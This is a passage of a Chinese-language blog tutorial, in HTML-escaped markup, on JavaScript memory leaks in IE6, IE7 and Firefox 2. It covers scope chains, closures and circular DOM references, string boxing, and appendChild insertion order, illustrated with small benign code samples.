style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;值得一提的是函数调用也会创建对象 &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;function&amp;nbsp;f(){&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;a=10;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;b=20;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;}&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;复制代码&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;尽管按照语言标准无法以任何方式访问，但是f函数在每次执行时都会创建一个有属性a和b的对象，这被称为作用域对象。而js将维护一个被称为scopechain的链表，它是一条由当前可访问的所有作用域对象组成的链表。因为js的作用域规则是定义时的作用域，所以每个函数对象被创建时都会以一个属性[[scope]]保存它的外部作用域链。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;特别地，在FireFox中，允许用__parent__访问[[scope]]属性所属的函数&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;关于js的更多，可以去查阅js标准文档ECMA262（HTML版），这里无法完整地介绍js的对象机制。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;2.内存泄露的原因&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;作为一门垃圾回收的语言（注意不是垃圾语言），内存泄露的原因只有一个：引擎的bug（本小节用于休闲、调节气氛）&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;3.内存泄露的方式&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;目前发现的可能导致内存泄露的代码有三种：&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;/p&gt;\r\n&lt;ul&gt;&lt;li&gt;循环引用 &lt;/li&gt;\r\n&lt;li&gt;自动类型装箱转换 &lt;/li&gt;\r\n&lt;li&gt;某些DOM操作&lt;/li&gt;\r\n&lt;/ul&gt;\r\n下面具体的来说说内存是如何泄露的 &lt;p style=&quot;text-indent:2em;&quot;&gt;循环引用：这种方式存在于IE6和FF2中（FF3未做测试），当出现了一个含有DOM对象的循环引用时，就会发生内存泄露。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;什么是循环引用？首先搞清楚什么是引用，一个对象A的属性被赋值为另一个对象B时，则可以称A引用了B。假如B也引用了A，那么A和B之间构成了循环引用。同样道理 如果能找到A引用B B引用CC又引用A这样一组饮用关系，那么这三个对象构成了循环引用。当一个对象引用自己时,它自己形成了循环引用。注意，在js中变量永远是对象的属性，它可以指向对象，但决不是对象本身。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;循环引用很常见，而且通常是无害的，但如果循环引用中包含DOM对象或者ActiveX对象，那么就会发生内存泄露。例子： &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;var&amp;nbsp;a=document.createElement(&quot;div&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;var&amp;nbsp;b=new&amp;nbsp;Object();&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;a.b=b;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;b.a=a;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;复制代码&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;很多情况下循环引用不是这样的明显，下面就是著名的闭包（closure）造成内存泄露的例子，每执行一次函数A()都会产生内存泄露。试试看，根据前面讲的scope对象的知识，能不能找出循环引用？ &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;function&amp;nbsp;A()...{&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;a=document.createElement(&quot;div&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;a.on&lt;wbr&gt;click=function()...{&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;alert(&quot;hi&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;}&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;A();&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;复制代码&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;OK, 让我们来看看。假设A()执行时创建的作用域对象叫做ScopeA 找到以下引用关系&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;ScopeA引用DOM对象document.createElement(&quot;div&quot;);&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;DOM对象document.createElement(&quot;div&quot;);引用函数function(){alert(&quot;hi&quot;)}&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;函数function(){alert(&quot;hi&quot;)}引用ScopeA&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;这样就很清楚了，所谓closure泄露，只不过是几个js特殊对象的循环引用而已。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;自动类型装箱转换：这种泄露存在于ie6 ie7中。这是极其匪夷所思的一个bug，看下面代码 &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;var s=&quot;lalalalala&quot;; &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;alert(s.length); &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;这段代码怎么了？看看吧，&quot;lalalalala&quot;已经泄露了。关键问题出在s.length上，我们知道js的类型中，string并非对象，但可以对它使用.运算符，为什么呢？因为js的默认类型转换机制，允许js在遇到.运算符时自动将string转换为object型中对应的String对象。而这个转换成的临时对象100%会泄露（汗一下）。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;某些DOM操作也可能导致泄露 这些恶心的bug只存在于ie系列中。在ie7中 因为试图fix循环引用bug而让情况变得更糟，以至于我对写这一段种满了恐惧。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;从ie6谈起，下面是微软的例子， &lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;html&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;head&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;script&amp;nbsp;language=&quot;JScript&quot;&amp;gt;...&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;function&amp;nbsp;LeakMemory()&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;...{&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;hostElement&amp;nbsp;=&amp;nbsp;document.getElementById(&quot;hostElement&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//&amp;nbsp;Do&amp;nbsp;it&amp;nbsp;a&amp;nbsp;lot,&amp;nbsp;look&amp;nbsp;at&amp;nbsp;Task&amp;nbsp;Manager&amp;nbsp;for&amp;nbsp;memory&amp;nbsp;response&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&amp;lt;&amp;nbsp;5000;&amp;nbsp;i++)&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;...{&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;parentDiv&amp;nbsp;=&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.createElement(&quot;&amp;lt;div&amp;nbsp;on&lt;wbr&gt;Click=''foo()''&amp;gt;&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;childDiv&amp;nbsp;=&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.createElement(&quot;&amp;lt;div&amp;nbsp;on&lt;wbr&gt;Click=''foo()''&amp;gt;&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//&amp;nbsp;This&amp;nbsp;will&amp;nbsp;leak&amp;nbsp;a&amp;nbsp;temporary&amp;nbsp;object&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;parentDiv.appendChild(childDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hostElement.appendChild(parentDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hostElement.removeChild(parentDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;parentDiv.removeChild(childDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;parentDiv&amp;nbsp;=&amp;nbsp;null;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;childDiv&amp;nbsp;=&amp;nbsp;null;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hostElement&amp;nbsp;=&amp;nbsp;null;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;function&amp;nbsp;CleanMemory()&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;...{&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;hostElement&amp;nbsp;=&amp;nbsp;document.getElementById(&quot;hostElement&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//&amp;nbsp;Do&amp;nbsp;it&amp;nbsp;a&amp;nbsp;lot,&amp;nbsp;look&amp;nbsp;at&amp;nbsp;Task&amp;nbsp;Manager&amp;nbsp;for&amp;nbsp;memory&amp;nbsp;response&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;for(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&amp;lt;&amp;nbsp;5000;&amp;nbsp;i++)&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;...{&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;parentDiv&amp;nbsp;=&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.createElement(&quot;&amp;lt;div&amp;nbsp;on&lt;wbr&gt;Click=''foo()''&amp;gt;&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;var&amp;nbsp;childDiv&amp;nbsp;=&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.createElement(&quot;&amp;lt;div&amp;nbsp;on&lt;wbr&gt;Click=''foo()''&amp;gt;&quot;);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//&amp;nbsp;Changing&amp;nbsp;the&amp;nbsp;order&amp;nbsp;is&amp;nbsp;imp&lt;wbr&gt;ortant,&amp;nbsp;this&amp;nbsp;won''t&amp;nbsp;leak&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hostElement.appendChild(parentDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;parentDiv.appendChild(childDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hostElement.removeChild(parentDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;parentDiv.removeChild(childDiv);&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;parentDiv&amp;nbsp;=&amp;nbsp;null;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;childDiv&amp;nbsp;=&amp;nbsp;null;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;hostElement&amp;nbsp;=&amp;nbsp;null;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;/script&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;/head&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;body&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;button&amp;gt;Memory&amp;nbsp;Leaking&amp;nbsp;Insert&amp;lt;/button&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;button&amp;gt;Clean&amp;nbsp;Insert&amp;lt;/button&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;div&amp;nbsp;id=&quot;hostElement&quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;/body&amp;gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&amp;lt;/html&amp;gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;复制代码&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;看看结果吧，LeakMemory造成了内存泄露，而CleanMemory没有，循环引用了么？仔细看看没有。那么是什么问题呢？MS的解释是&quot;插入顺序不对&quot;,必须先将父级元素appendChild。这听起来有些模糊，这里给出一个比较恰当的等价描述：永远不要使用DOM节点树之外元素的appendChild方法。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;接下来是ie7和ie8 beta1中运行这段程序，看到什么？没看错吧，2个都泄露了！别急，刷新一下页面就好了。为什么呢？ie7改变了DOM元素的回收方式：在离开页面时回收DOM树上的所有元素，所以ie7下的内存管理非常简单：在所有的页面中只要挂在DOM树上的元素，就不会泄露，没挂在DOM树上，肯定泄露。所以，ie7中记住一条原则：在离开页面之前把所有创建的DOM元素挂到DOM树上。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;接下来谈谈ie7的这个设计吧，坦白的说，这种做法纯粹是偷懒的垃圾做法。动态垃圾回收不是保证所有内存都在离开页面时收回，而是要保证内存的充分利用，运行时不回收，等到离开时回收有什么用？这只是名义上的避免泄露，其实是完全的泄露。况且还没有回收DOM节点树之外的元素。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;4.内存泄露的解决方案&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;内存泄露怎么办？真的以后不用闭包了么？没法封装控件了？这样做还不如要了js程序员的命，嘿嘿。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;事实上，通过一些很简单的小技巧，可以巧妙的绕开这些危险的bug。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;to be continued......&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;coming soon:&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;/p&gt;\r\n&lt;ul&gt;&lt;li&gt;显式类型转换 &lt;/li&gt;\r\n&lt;li&gt;避免事件导致的循环引用 &lt;/li&gt;\r\n&lt;li&gt;不影响返回值地打破循环引用 &lt;/li&gt;\r\n&lt;li&gt;延迟appendChild &lt;/li&gt;\r\n&lt;li&gt;代理DOM对象&lt;/li&gt;\r\n&lt;li&gt;&lt;strong&gt;4.内存泄露的解决方案&lt;br /&gt;\r\n&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;显式类型转换 &lt;/strong&gt;&lt;/li&gt;\r\n&lt;/ul&gt;\r\n首先说说最容易处理的情况 对于类型转换造成的错误，我们可以通过显式类型转换来避免： &lt;div style=&quot;background:none repeat-y scroll 0px 0px #f7f7f7;&quot;&gt;&lt;div&gt;&lt;span style=&quot;color:#007700;&quot;&gt;var&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;s&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;color:#0000bb;&quot;&gt;newString&lt;/span&gt;&lt;span style=&quot;color:#007700;&quot;&gt;(&lt;/span&gt;&lt;span 